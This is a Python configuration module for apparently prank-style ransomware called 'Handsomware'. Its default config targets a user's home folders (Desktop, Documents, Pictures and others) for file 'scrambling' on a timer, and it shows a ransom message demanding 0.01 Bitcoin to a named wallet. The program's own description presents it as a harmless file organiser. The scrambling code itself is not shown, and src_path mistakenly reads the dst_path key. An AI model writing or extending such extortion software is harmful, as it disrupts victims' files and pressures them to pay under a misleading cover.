import json
import os
from pathlib import Path

from core.logger import logger


DEFAULT_FILENAME = "config.json"


class Config:
    def __init__(self, path=DEFAULT_FILENAME):
        self.config_path = path

        if not os.path.exists(path):
            self.__create_default_config()

        with open(path, "r") as f:
            data = json.load(f)

        self.scramble_delay = data.get("scramble_delay_seconds", 10)
        self.scramble_folder_prefix = data.get("scramble_folder_prefix", "Folder_")
        self.window_title = data.get("window_title", "Handsomware 😎")
        self.ransom_message = data.get("ransom_message", "Enter any amount to restore:")
        self.button_text: str = data.get("button_text", "Submit")
        self.content_path: dict = data.get("content_path", {})
        self.dst_path = data.get("dst_path", os.environ.get("HOME"))
        self.src_path = data.get("dst_path", os.environ.get("HOME"))
        self.time_limit = data.get("time_limit", 120)
        self.paths_to_watch = [
            os.path.join(self.src_path, p) for p in data.get("paths_to_watch", [])
        ]

    def __create_default_config(self):
        logger.info("Creating default config file...")
        home = Path.home()

        default_paths = [
            "Desktop",
            "Downloads",
            "Documents",
            "Pictures",
            "Music",
            "Videos",
        ]
        # default_paths = [os.path.join(home, d_file) for d_file in default_files]
        config = {
            "name": "Handsomeware",
            "description": "Move files to their appropriate folder",
            "version": "1.0",
            "author": "dhanzy",
            "paths_to_watch": default_paths,
            "scramble_delay_seconds": 10,
            "scramble_folder_prefix": "Folder_",
            "window_title": "Handsomware 😎",
            "ransom_message": "Your files have been rearranged by Handsomware 😎\nSend 0.01 Bitcoin to the wallet: 1BhNrgXxtGf6JGBQ1FyVedfvW2rekEoj9u.:",
            "button_text": "Submit",
            "src_path": os.environ.get("HOME"),
            "dst_path": os.environ.get("HOME"),
            "time_limit": 120,
            "content_path": {
                ".mp3": "Music",
                ".mp4": "Videos",
                ".mkv": "Videos",
                ".pdf": "Documents",
                ".jpeg": "Pictures",
                ".jpg": "Pictures",
                ".png": "Pictures",
            },
        }

        with open(self.config_path, "w") as f:
            json.dump(config, f, indent=4)
